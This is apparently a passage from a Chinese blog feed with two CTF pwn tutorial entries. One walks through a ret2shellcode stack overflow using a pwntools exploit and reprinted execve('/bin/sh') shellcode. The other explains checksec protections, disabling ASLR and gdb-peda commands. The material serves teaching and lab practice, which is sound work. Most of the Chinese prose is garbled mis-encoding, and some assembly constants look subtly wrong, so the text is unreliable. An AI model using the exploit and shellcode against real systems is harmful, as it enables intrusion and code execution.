æ•ˆåœ°å€ä¾‹å¦‚â€œAAAAâ€è¦†ç›–ï¼Œç¨‹åºä¼šç»ˆæ­¢å¹¶æŠ¥é”™ï¼‰ã€‚</p><ol><li>shellcodeèµ·å§‹åœ°å€åº”è¯¥æ˜¯å¤šå°‘ï¼Ÿ</li></ol><p>æˆ‘ä»¬å¯ä»¥åœ¨è°ƒè¯•å·¥å…·é‡ŒæŸ¥çœ‹è¿”å›åœ°å€çš„ä½ç½®ï¼ˆå¯ä»¥æŸ¥çœ‹ ebp çš„å†…å®¹ç„¶åå†åŠ 4ï¼ˆ32ä½æœºï¼‰ï¼Œå‚è§å‰é¢å…³äºå‡½æ•°çŠ¶æ€çš„è§£é‡Šï¼‰ï¼Œå¯æ˜¯åœ¨è°ƒè¯•å·¥å…·é‡Œçš„è¿™ä¸ªåœ°å€å’Œæ­£å¸¸è¿è¡Œæ—¶å¹¶ä¸ä¸€è‡´ï¼Œè¿™æ˜¯è¿è¡Œæ—¶ç¯å¢ƒå˜é‡ç­‰å› ç´ æœ‰æ‰€ä¸åŒé€ æˆçš„ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬åªèƒ½å¾—åˆ°å¤§è‡´ä½†ä¸ç¡®åˆ‡çš„ shellcode èµ·å§‹åœ°å€ï¼Œè§£å†³åŠæ³•æ˜¯åœ¨ padding2 é‡Œå¡«å……è‹¥å¹²é•¿åº¦çš„ â€œ\x90â€ã€‚è¿™ä¸ªæœºå™¨ç å¯¹åº”çš„æŒ‡ä»¤æ˜¯ NOP (No Operation)ï¼Œä¹Ÿå°±æ˜¯å‘Šè¯‰ CPU ä»€ä¹ˆä¹Ÿä¸åšï¼Œç„¶åè·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚æœ‰äº†è¿™ä¸€æ®µ NOP çš„å¡«å……ï¼Œåªè¦è¿”å›åœ°å€èƒ½å¤Ÿå‘½ä¸­è¿™ä¸€æ®µä¸­çš„ä»»æ„ä½ç½®ï¼Œéƒ½å¯ä»¥æ— å‰¯ä½œç”¨åœ°è·³è½¬åˆ° shellcode çš„èµ·å§‹å¤„ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•è¢«ç§°ä¸º NOP Sledï¼ˆä¸­æ–‡å«ä¹‰æ˜¯â€œæ»‘é›ªæ©‡â€ï¼‰ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¢åŠ  NOP å¡«å……æ¥é…åˆè¯•éªŒ shellcode èµ·å§‹åœ°å€ã€‚</p><p>æ“ä½œç³»ç»Ÿå¯ä»¥å°†å‡½æ•°è°ƒç”¨æ ˆçš„èµ·å§‹åœ°å€è®¾ä¸ºéšæœºåŒ–ï¼ˆè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºå†…å­˜å¸ƒå±€éšæœºåŒ–ï¼Œå³Address Space Layout Randomization (ASLR) ï¼‰ï¼Œè¿™æ ·ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶å‡½æ•°è¿”å›åœ°å€ä¼šéšæœºå˜åŒ–ã€‚åä¹‹å¦‚æœæ“ä½œç³»ç»Ÿå…³é—­äº†ä¸Šè¿°çš„éšæœºåŒ–ï¼ˆè¿™æ˜¯æŠ€æœ¯å¯ä»¥ç”Ÿæ•ˆçš„å‰æï¼‰ï¼Œé‚£ä¹ˆç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶å‡½æ•°è¿”å›åœ°å€ä¼šæ˜¯ç›¸åŒçš„ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥æ— æ•ˆçš„æº¢å‡ºæ•°æ®æ¥ç”Ÿæˆcoreæ–‡ä»¶ï¼Œå†é€šè¿‡è°ƒè¯•å·¥å…·åœ¨coreæ–‡ä»¶ä¸­æ‰¾åˆ°è¿”å›åœ°å€çš„ä½ç½®ï¼Œä»è€Œç¡®å®š shellcode çš„èµ·å§‹åœ°å€ã€‚</p><p>è§£å†³å®Œä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¼æ¥å‡ºæœ€ç»ˆçš„æº¢å‡ºæ•°æ®ï¼Œè¾“å…¥è‡³ç¨‹åºæ¥æ‰§è¡Œ shellcode äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220141.png" alt="å›¾2 payload"></p><p>è¿™ç§æ–¹æ³•ç”Ÿæ•ˆçš„ä¸€ä¸ªå‰ææ˜¯åœ¨å‡½æ•°è°ƒç”¨æ ˆä¸Šçš„æ•°æ®ï¼ˆshellcodeï¼‰è¦æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼ˆå¦ä¸€ä¸ªå‰ææ˜¯ä¸Šé¢æåˆ°çš„å…³é—­å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼‰ã€‚å¾ˆå¤šæ—¶å€™æ“ä½œç³»ç»Ÿä¼šå…³é—­å‡½æ•°è°ƒç”¨æ ˆçš„å¯æ‰§è¡Œæƒé™ï¼Œè¿™æ · shellcode çš„æ–¹æ³•å°±å¤±æ•ˆäº†ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜å¯ä»¥å°è¯•ä½¿ç”¨å†…å­˜é‡Œå·²æœ‰çš„æŒ‡ä»¤æˆ–å‡½æ•°ï¼Œæ¯•ç«Ÿè¿™äº›éƒ¨åˆ†æœ¬æ¥å°±æ˜¯å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ä¸ä¼šå—ä¸Šè¿°æ‰§è¡Œæƒé™çš„é™åˆ¶ã€‚</p><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>æœ¬é¢˜åŒæ ·æ¥è‡ªäºctf-wiki\challengespwn\stackoverflow\ret2shellcode</p><p>é¢˜ç›®æºç </p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <string.h>char buf2[100];int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("No system for you this time !!!\n");    gets(buf);    strncpy(buf2, buf, 100);//å°† bufä¼ ç»™buf2    printf("bye bye ~");    return 0;}</string.h></stdio.h></code></pre><p>ç¼–è¯‘å‘½ä»¤ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -z execstack -fno-stack-protector//å…³é—­cannary nxä¿æŠ¤</code></pre><p>ç¨‹åºå…³é—­äº†nxä¿æŠ¤è¿™å°±æ„å‘³ç€æˆ‘ä»¬è¾“å…¥æ ˆä¸­çš„æ•°æ®å˜å¾—å¯ä»¥æ‰§è¡Œ</p><p>è¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ˜¯ä¸€æ®µæ±‡ç¼–æŒ‡ä»¤ä¹Ÿä¼šè¢«æ‰§è¡Œ</p><p>åœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">                                           +-----------------+                                           |     retaddr     |                                           +-----------------+                                           |     saved ebp   |                                    ebp---&gt;+-----------------+                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                            buf,ebp-0xc----&gt;+-----------------+</code></pre><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è¯»å–å­—ç¬¦ä¸²ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x6c*'a'+'bbbb'+success_addr//success_addrä¸ºæˆ‘ä»¬æƒ³è¦è·³è½¬çš„åœ°å€</code></pre><blockquote><p>ä¸ºä»€ä¹ˆæ˜¯0x6cè€Œä¸æ˜¯idaé‡Œè¯´çš„0x64ï¼Ÿ</p></blockquote><p>ä¸»è¦æ˜¯å› ä¸ºIDAé‡Œå‡ºæ¥çš„åç§»é‡å¹¶ä¸æ˜¯æ¯æ¬¡éƒ½æ˜¯å‡†ç¡®çš„ï¼Œéœ€è¦æˆ‘ä»¬ç”¨GDBæ‰‹åŠ¨æ¥è°ƒè¯•ï¼ˆç½‘ä¸Šæ˜¯è¿™æ ·è¯´çš„ï¼Œæˆ‘æŸ¥äº†ä¸€ä¸‹åˆï¼Œï¼Œï¼Œï¼‰</p><p>é‚£ä¹ˆï¼Œç”±äº gets ä¼šè¯»åˆ°å›è½¦æ‰ç®—ç»“æŸï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»å–æ‰€æœ‰çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å°† saved ebp è¦†ç›–ä¸º bbbbï¼Œå°† retaddr è¦†ç›–ä¸º success_addrï¼Œå³ï¼Œæ­¤æ—¶çš„æ ˆç»“æ„ä¸º</p><pre class=" language-lang-txt"><code class="language-lang-txt">                                           +-----------------+                                           |  success_addr   |                                           +-----------------+                                           |       bbbb      |                                    ebp---&gt;+-----------------+                                           |                 |                                           |                 |                                           | 'a'*0x6c        |                                           |                 |                                           |                 |                                           |                 |                              s,ebp-0x64--&gt;+-----------------+</code></pre><p>ç”±äºå­˜åœ¨strncpyï¼ˆbuf2,buf,100ï¼‰,å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠshellcodeé€šè¿‡bufå†™å…¥åˆ°buf2ä¸­ï¼Œç„¶åæˆ‘ä»¬çŸ¥é“buf2çš„åœ°å€ï¼Œå³ï¼šbuf2çš„åœ°å€å°±æ˜¯shellcodeçš„èµ·å§‹åœ°å€ï¼Œæˆ‘ä»¬åœ¨å°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºbuf2çš„åœ°å€ï¼Œç¨‹åºæ²¡æœ‰å¼€å¯NX,ç¨‹åºæ•°æ®ä¸­çš„shellcodeå¯ä»¥æ‰§è¡Œï¼Œè¿”å›shell</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *sh=process('./ret2shellcode')#è¿™é‡Œä½¿ç”¨çš„æ˜¯pwntoolsè‡ªå¸¦çš„shellcodeç”Ÿæˆçš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç½‘ä¸Šçš„#asm(shellcraft.sh()) //å°†shellcodeæ±‡ç¼–ä¸ºæ±‡ç¼–ä»£ç shellcode=asm(shellcraft.sh())buf2_addr=0x0804A080payload=shellcode.ljust(0x6c+0x4,'a')+p32(buf2_addr)sh.sendafter(""No system for you this time !!!\n"",payload)sh.interactive()</code></pre><h2 id="0x40-shellcode-example-of-32-and-64"><a href="#0x40-shellcode-example-of-32-and-64" class="headerlink" title="0x40 shellcode example of 32 and 64"></a>0x40 shellcode example of 32 and 64</h2><p>shellcode32:</p><pre class=" language-lang-shell"><code class="language-lang-shell">/* -------------- FreeBSD/x86 - execv("/bin/sh") 23 bytes ------------------------- *  AUTHOR : Tosh *   OS    : BSDx86 (Tested on FreeBSD 8.1) *   EMAIL : tosh@tuxfamily.org */#include <string.h>#include <stdio.h>char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"                   "\x68\x2f\x62\x69\x6e\x89\xe3\x50"                   "\x54\x53\xb0\x3b\x50\xcd\x80";int main(void){   void(*f)() = (void*)shellcode;   printf("Len = %d\n", sizeof(shellcode)-1);   f();}/*! %define SYS_EXECV 59section .textglobal _start_start:   xor eax, eax   push eax   push '//sh'   push '/bin'   mov ebx, esp   push eax   push esp   push ebx   mov al, SYS_EXECV   push eax   int 0x80*/</stdio.h></string.h></code></pre><p>shellcode64:</p><pre class=" language-lang-shell"><code class="language-lang-shell">/**  * *   _   _            _            ____       _ _  *  | | | | __ _  ___| | ___ __   |  _ \ ___ | | | *  | |_| |/ _` |/ __| |/ / '_ \  | |_) / _ \| | | *  |  _  | (_| | (__|   &lt;| | | | |  _ &lt; (_) | | | *  |_| |_|\__,_|\___|_|\_\_| |_| |_| \_\___/|_|_| *           [ http://www.hacknroll.com ] * * Description: *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes * * * * Authors: *    Maycon M. Vitali ( 0ut0fBound ) *        Milw0rm .: http://www.milw0rm.com/author/869 *        Page ....: http://maycon.hacknroll.com *        Email ...: maycon@hacknroll.com * *    Anderson Eduardo ( c0d3_z3r0 ) *        Milw0rm .: http://www.milw0rm.com/author/1570 *        Page ....: http://anderson.hacknroll.com *        Email ...: anderson@hacknroll.com *  * ------------------------------------------------------- *    * amd64# gcc hacknroll.c -o hacknroll * amd64# ./hacknroll * # exit * amd64# * * ------------------------------------------------------- */const char shellcode[] =        "\x48\x31\xc0"                               // xor    %rax,%rax        "\x99"                                       // cltd        "\xb0\x3b"                                   // mov    $0x3b,%al        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi        "\x57"                                       // push   %rdi        "\x48\x89\xe7"                               // mov    %rsp,%rdi        "\x57"                                       // push   %rdi        "\x52"                                       // push   %rdx        "\x48\x89\xe6"                               // mov    %rsp,%rsi        "\x0f\x05";                                  // syscallint main(void){        (*(void (*)()) shellcode)();        return 0;}</code></pre><p>shellcodeDB: <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p><h2 id="0x50-shellcode64ä½æ±‡ç¼–æŒ‡ä»¤è§£æ"><a href="#0x50-shellcode64ä½æ±‡ç¼–æŒ‡ä»¤è§£æ" class="headerlink" title="0x50 shellcode64ä½æ±‡ç¼–æŒ‡ä»¤è§£æ"></a>0x50 shellcode64ä½æ±‡ç¼–æŒ‡ä»¤è§£æ</h2><p>å‰ç½®çŸ¥è¯†</p><p>64ä½å‡½æ•°å‚æ•°ä¼ é€’æ–¹å¼ï¼š<a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/</a></p><p>å½“å‚æ•°å°‘äº7ä¸ªæ—¶ï¼Œ å‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: rdi, rsi, rdx, rcx, r8, r9</p><pre class=" language-lang-txt"><code class="language-lang-txt">_start:    xor rax,rax        ;clear rax    add rax,0x3b    ;syscall_64.tbl    xor rdi,rdi        ;clear rdi    push rdi    mov rdi,0x68732f26e69622f    ;hs//nib/==&gt;bin/shå†™å…¥rdi    push rdi        ;push stark(rsp-=8) ç°åœ¨rsp==&gt;bin/sh    lea rdi,[rsp]    ;rdi=rsp(%rdi,%rsi,%rdx,%rcx,%r8,%r9ç”¨ä½œå‡½æ•°å‚æ•°ï¼Œä¾æ¬¡å¯¹åº”ç¬¬ä¸€ã€ç¬¬äºŒå‚æ•°)å–bin/shçš„åœ°å€æ”¾åˆ°rdié‡Œ    xor rsi,rsi        ;clear rsi    xor rdx,rdx        ;clear rdx    syscall</code></pre><p>ç¼–è¯‘å‘½ä»¤ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">nasm -f elf64 shasm.asm -o shasm.o ç¼–è¯‘æ±‡ç¼–ç¨‹åºï¼Œelf64æŒ‡å®šæ–‡ä»¶ç±»å‹ld -s -o shasm shasm.o  é“¾æ¥ç›®æ ‡æ–‡ä»¶objcopy -O binary shasm.o.code æå–å…¶ä¸­çš„shellcodeéƒ¨åˆ†xxd code æ˜¾ç¤ºæ–¹ä¾¿</code></pre><h2 id="0x60-pwntoos-shellcraft-sh"><a href="#0x60-pwntoos-shellcraft-sh" class="headerlink" title="0x60 pwntoos shellcraft.sh()"></a>0x60 pwntoos shellcraft.sh()</h2><pre class=" language-lang-txt"><code class="language-lang-txt">/* execve(path='/bin///sh', argv=['sh'], envp=0) */    /* push '/bin///sh\x00' */ ==&gt;0x68732f26e69622f    push 0x68    push 0x732f2f2f    push 0x6e69622f            mov ebx, esp    /* push argument array ['sh\x00'] */    /* push 'sh\x00\x00' */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* 'sh\x00' */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80</code></pre><p>int 0x80åœ¨linuxä¸­ç”¨æ¥å¤„ç†system_call,intè¡¨ç¤ºä¸­æ–­ï¼Œæ•°å­—0x80æ˜¯ä¸­æ–­å·ã€‚ ä¸­æ–­å°†ç¨‹åºstreamä¼ é€ç»™æ­£åœ¨å¤„ç†è¯¥ä¸­æ–­çš„äººï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸­æ–­ä¸º0x80ã€‚ åœ¨Linuxä¸­ï¼Œ0x80ä¸­æ–­å¤„ç†ç¨‹åºæ˜¯å†…æ ¸ï¼Œç”¨äºç”±å…¶ä»–ç¨‹åºå¯¹å†…æ ¸è¿›è¡Œç³»ç»Ÿè°ƒç”¨.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnåŸºç¡€----ä¿æŠ¤æœºåˆ¶(checksec)</title>
      <link href="/2020/02/18/ctf/pwn/pwn-basic/"/>
      <url>/2020/02/18/ctf/pwn/pwn-basic/</url>
      
        <content type="html"><![CDATA[<h1 id="PWNå­¦ä¹ è®°å½•"><a href="#PWNå­¦ä¹ è®°å½•" class="headerlink" title="PWNå­¦ä¹ è®°å½•"></a>PWNå­¦ä¹ è®°å½•</h1><h2 id="CTFä¸­pwnçš„ä¿æŠ¤æœºåˆ¶ï¼ˆå¸¸è§çš„ï¼‰"><a href="#CTFä¸­pwnçš„ä¿æŠ¤æœºåˆ¶ï¼ˆå¸¸è§çš„ï¼‰" class="headerlink" title="CTFä¸­pwnçš„ä¿æŠ¤æœºåˆ¶ï¼ˆå¸¸è§çš„ï¼‰"></a>CTFä¸­pwnçš„ä¿æŠ¤æœºåˆ¶ï¼ˆå¸¸è§çš„ï¼‰</h2><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200203234407.png" alt=""></p><p>GCCç¼–è¯‘æ—¶ä¿æŠ¤çš„å¼€å…³ï¼š</p><ol><li>NXï¼š-z execstack / -z noexecstack (å…³é—­ / å¼€å¯)    ä¸è®©æ‰§è¡Œæ ˆä¸Šçš„æ•°æ®ï¼Œäºæ˜¯JMP ESPå°±ä¸èƒ½ç”¨äº†</li><li>Canaryï¼š-fno-stack-protector /-fstack-protector / -fstack-protector-all (å…³é—­ / å¼€å¯ / å…¨å¼€å¯)  æ ˆé‡Œæ’å…¥cookieä¿¡æ¯</li><li>PIEï¼š-no-pie / -pie (å…³é—­ / å¼€å¯)   åœ°å€éšæœºåŒ–ï¼Œå¦å¤–æ‰“å¼€åä¼šæœ‰get_pc_thunk</li><li>RELROï¼š-z norelro / -z lazy / -z now (å…³é—­ / éƒ¨åˆ†å¼€å¯ / å®Œå…¨å¼€å¯)  å¯¹GOTè¡¨å…·æœ‰å†™æƒé™</li></ol><h3 id="ARCH"><a href="#ARCH" class="headerlink" title="ARCH"></a>ARCH</h3><p>Arch:     amd64-64-little  â€”    æ–‡ä»¶ç±»å‹</p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO:    Full RELRO   â€” é‡å®šå‘ RELROä¼šæœ‰Partial RELROå’ŒFULL RELROï¼Œå¦‚æœå¼€å¯FULL RELROï¼Œæ„å‘³ç€æˆ‘ä»¬æ—     æ³•ä¿®æ”¹gotè¡¨</p><p>è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚RELROä¸ºâ€ Partial RELROâ€ï¼Œè¯´æ˜æˆ‘ä»¬å¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚</p><h3 id="CANNARY-æ ˆä¿æŠ¤ï¼‰"><a href="#CANNARY-æ ˆä¿æŠ¤ï¼‰" class="headerlink" title="CANNARY(æ ˆä¿æŠ¤ï¼‰"></a>CANNARY(æ ˆä¿æŠ¤ï¼‰</h3><p>Stack:    No canary found   â€” æ ˆæ£€æŸ¥ï¼Œå¦‚æœæ ˆä¸­å¼€å¯Canary foundï¼Œé‚£ä¹ˆå°±ä¸èƒ½ç”¨ç›´æ¥ç”¨æº¢å‡ºçš„æ–¹æ³•è¦†ç›–æ ˆä¸­è¿”å›åœ°å€ï¼Œè€Œä¸”è¦é€šè¿‡æ”¹å†™æŒ‡é’ˆä¸å±€éƒ¨å˜é‡ã€leak canaryã€overwrite canaryçš„æ–¹æ³•æ¥ç»•è¿‡</p><p>è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºæ ˆä¿æŠ¤åŠŸèƒ½æœ‰æ²¡æœ‰å¼€å¯ã€‚</p><p>æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚</p><p>gccåœ¨4.2ç‰ˆæœ¬ä¸­æ·»åŠ äº†-fstack-protectorå’Œ-fstack-protector-allç¼–è¯‘å‚æ•°ä»¥æ”¯æŒæ ˆä¿æŠ¤åŠŸèƒ½ï¼Œ4.9æ–°å¢äº†-fstack-protector-strongç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿ã€‚</p><p>å› æ­¤åœ¨ç¼–è¯‘æ—¶å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯æ ˆä¿æŠ¤ä»¥åŠç¨‹åº¦ï¼Œä¾‹å¦‚ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -fno-stack-protector -o test test.c  //ç¦ç”¨æ ˆä¿æŠ¤gcc -fstack-protector -o test test.c   //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç gcc -fstack-protector-all -o test test.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </code></pre><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX:       NX enabled    â€” ä¸å¯æ‰§è¡Œï¼Œ å¦‚æœè¿™ä¸ªä¿æŠ¤å¼€å¯å°±æ˜¯æ„å‘³ç€æ ˆä¸­æ•°æ®æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œä»¥å‰çš„ç»å¸¸ç”¨çš„call espæˆ–è€…jmp espçš„æ–¹æ³•å°±ä¸èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ropè¿™ç§æ–¹æ³•ç»•è¿‡</p><p>gccç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº†NXé€‰é¡¹ï¼Œå¦‚æœéœ€è¦å…³é—­NXé€‰é¡¹ï¼Œå¯ä»¥ç»™gccç¼–è¯‘å™¨æ·»åŠ -z execstackå‚æ•°ã€‚</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -z execstack -o test test.c</code></pre><p>åœ¨Windowsä¸‹ï¼Œç±»ä¼¼çš„æ¦‚å¿µä¸ºDEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰ï¼Œåœ¨æœ€æ–°ç‰ˆçš„Visual Studioä¸­é»˜è®¤å¼€å¯äº†DEPç¼–è¯‘é€‰é¡¹ã€‚</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE:      PIE enabled   â€” åœ°å€éšæœºåŒ–ï¼Œå¦‚æœç¨‹åºå¼€å¯è¿™ä¸ªåœ°å€éšæœºåŒ–é€‰é¡¹å°±æ„å‘³ç€ç¨‹åºæ¯æ¬¡è¿è¡Œçš„æ—¶å€™åœ°å€éƒ½ä¼šå˜åŒ–ï¼Œè€Œå¦‚æœæ²¡æœ‰å¼€PIEçš„è¯é‚£ä¹ˆNo PIE (0x400000)ï¼Œæ‹¬å·å†…çš„æ•°æ®å°±æ˜¯ç¨‹åºçš„åŸºåœ°å€</p><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°å…¶ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚</p><p>å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶ï¼ˆaddress space layout randomization)ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µ</p><pre class=" language-lang-txt"><code class="language-lang-txt">0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚</code></pre><p>liunxä¸‹å…³é—­PIEçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre><h2 id="GDB-pedaçš„åŸºæœ¬è°ƒè¯•å‘½ä»¤"><a href="#GDB-pedaçš„åŸºæœ¬è°ƒè¯•å‘½ä»¤" class="headerlink" title="GDB-pedaçš„åŸºæœ¬è°ƒè¯•å‘½ä»¤"></a>GDB-pedaçš„åŸºæœ¬è°ƒè¯•å‘½ä»¤</h2><pre class=" language-lang-txt"><code class="language-lang-txt">pedaçš„ä¸€ä¸ªå®ç”¨å‘½ä»¤checksecæ£€æµ‹å®‰å…¨ä¿æŠ¤ã€‚pedaçš„å¦ä¸€ä¸ªå®ç”¨å‘½ä»¤searchmemç”¨æœç´¢å†…å­˜file è·¯å¾„ã€€ã€€é™„åŠ æ–‡ä»¶r   ã€€ã€€ã€€ã€€å¼€å§‹æ‰§è¡Œc              ç»§ç»­æ‰§è¡Œstep          å•æ­¥æ­¥å…¥next          å•æ­¥æ­¥è¿‡b *åœ°å€ã€€ã€€ä¸‹æ–­ç‚¹enable       æ¿€æ´»æ–­ç‚¹disable      ç¦ç”¨æ–­ç‚¹info b        æŸ¥çœ‹æ–­ç‚¹del num     åˆ é™¤æ–­ç‚¹x/wx $esp ã€€ã€€ä»¥4å­—èŠ‚16è¿›åˆ¶æ˜¾ç¤ºæ ˆä¸­å†…å®¹stack 100ã€€ã€€  æ’ä»¶æä¾›çš„ï¼Œæ˜¾ç¤ºæ ˆä¸­100é¡¹ find xxxã€€ã€€   å¿«é€ŸæŸ¥æ‰¾ï¼Œå¾ˆå®ç”¨s æŒ‰å­—ç¬¦ä¸²è¾“å‡ºx æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚d æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚u æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚o æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚t æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚a æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚c æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚f 